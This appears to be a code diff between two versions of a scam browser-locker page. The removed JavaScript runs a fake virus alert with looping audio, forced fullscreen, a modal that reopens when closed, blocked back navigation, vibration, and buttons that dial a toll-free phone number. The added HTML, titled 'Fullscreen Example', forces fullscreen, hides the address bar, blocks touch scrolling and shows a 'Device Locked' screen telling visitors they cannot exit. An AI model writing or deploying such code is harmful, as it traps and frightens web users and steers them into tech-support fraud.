@@ -1,115 +1,119 @@
-$(document).ready(() => {
-    function startCountdown() {
-        let timeInSeconds = 5 * 60; // 5 minutes in seconds
-
-        const countdown = setInterval(() => {
-            let minutes = Math.floor(timeInSeconds / 60);
-            let seconds = timeInSeconds % 60;
-
-            // Format minutes and seconds to always show 2 digits
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            // Update the timer display
-            document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;
-
-            // Decrease time by 1 second
-            timeInSeconds--;
-
-            // When the countdown reaches 0, restart the timer
-            if (timeInSeconds < 0) {
-                clearInterval(countdown);
-                startCountdown(); // Restart the countdown
-            }
-        }, 1000);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <title>Fullscreen Example</title>
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
     }
+    .content {
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .btn {
+      padding: 10px 20px;
+      font-size: 20px;
+      background-color: red;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modal.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .modal-content {
+      background: white;
+      padding: 20px;
+      text-align: center;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="content">
+    <h1>Welcome to the Fullscreen Page</h1>
+    <button class="btn" id="startBtn">Start</button>
+  </div>
 
-    // Start the countdown
-    startCountdown();
+  <div class="modal" id="lockModal">
+    <div class="modal-content">
+      <h2>Device Locked</h2>
+      <p>You can no longer scroll or exit this screen.</p>
+    </div>
+  </div>
 
-    const virusModal = document.getElementById("virusModal");
-    const modalInstance = new bootstrap.Modal(virusModal);
-    const audioPlayer = $("#audioPlayer")[0];
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const startBtn = document.getElementById('startBtn');
+      const lockModal = document.getElementById('lockModal');
 
-    audioPlayer.play();
+      // Function to hide the address bar and go fullscreen
+      function hideAddressBarAndEnterFullscreen() {
+        // Wait for the page to load and scroll slightly to hide the address bar
+        window.scrollTo(0, 1);  // This hides the address bar on mobile Safari
 
-    audioPlayer.addEventListener("ended", () => {
-        audioPlayer.play();
-    });
+        // Request fullscreen if available
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          document.documentElement.webkitRequestFullscreen();
+        }
 
-    // Function to hide address bar and go fullscreen
-    function hideAddressBarAndShowModal() {
+        // Show the modal to lock the user
         setTimeout(() => {
-            window.scrollTo(0, 1); // Push page slightly to hide address bar
-        }, 1000);
+          lockModal.classList.add('show');
+        }, 500); // Delay to ensure fullscreen and scrolling have happened
+      }
 
-        modalInstance.show(); // Show modal
-        navigator.vibrate(200);
-    }
+      // Listen for the "Start" button click to initiate the fullscreen and locking behavior
+      startBtn.addEventListener('click', () => {
+        hideAddressBarAndEnterFullscreen();
+      });
 
-    // Function to force fullscreen
-    function goFullScreen() {
-        const element = document.documentElement; // Use the whole document for fullscreen
-
-        if (element.requestFullscreen) {
-            element.requestFullscreen();
-        } else if (element.mozRequestFullScreen) {
-            // Firefox
-            element.mozRequestFullScreen();
-        } else if (element.webkitRequestFullscreen) {
-            // Chrome, Safari and Opera
-            element.webkitRequestFullscreen();
-        } else if (element.msRequestFullscreen) {
-            // IE/Edge
-            element.msRequestFullscreen();
+      // Listen for scroll events to trigger fullscreen after user scrolls
+      window.addEventListener('scroll', () => {
+        if (window.scrollY > 0) {
+          hideAddressBarAndEnterFullscreen();
         }
-    }
+      });
 
-    // Block scrolling by reopening modal
-    function preventScroll() {
-        modalInstance.show();
-        hideAddressBarAndShowModal();
-    }
-
-    if (virusModal) {
-        // Event listener for when modal is shown
-        virusModal.addEventListener("show.bs.modal", () => {
-            goFullScreen();
-            audioPlayer.play();
-        });
-
-        // Event listener for when modal is completely hidden
-        virusModal.addEventListener("hidden.bs.modal", () => {
-            // Reopen the modal after a short delay
-            setTimeout(() => {
-                preventScroll();
-            }, 300); // 0.3-second delay
-        });
-    }
-
-    // Prevent upward scrolling by forcing modal
-    window.addEventListener("scroll", () => {
-        if (window.pageYOffset === 0) {
-            preventScroll();
+      // Prevent further scrolling and interactions by locking the modal in place
+      window.addEventListener('scroll', (e) => {
+        if (window.scrollY === 0) {
+          e.preventDefault(); // Prevent scrolling
         }
+      });
+
+      // Prevent any touch interactions after locking
+      window.addEventListener('touchmove', (e) => {
+        e.preventDefault();
+      });
     });
-
-    window.addEventListener("touchstart", preventScroll);
-    window.addEventListener("click", preventScroll);
-
-    // Add event listener for button vibration
-    $("#vibrateButton").on("click", preventScroll);
-
-    // Add event listeners for call buttons
-    $("#callButton, #callButton1, #callButton2").on("click", () => {
-        const phoneNumber = "tel:+18778381219"; // Replace with desired phone number
-        window.location.href = phoneNumber;
-    });
-
-    // Prevent the backspace key from navigating back
-    history.pushState(null, null, window.location.href);
-    window.onpopstate = () => history.forward();
-
-    // Hide address bar on load
-    hideAddressBarAndShowModal();
-});
+  </script>
+</body>
+</html>
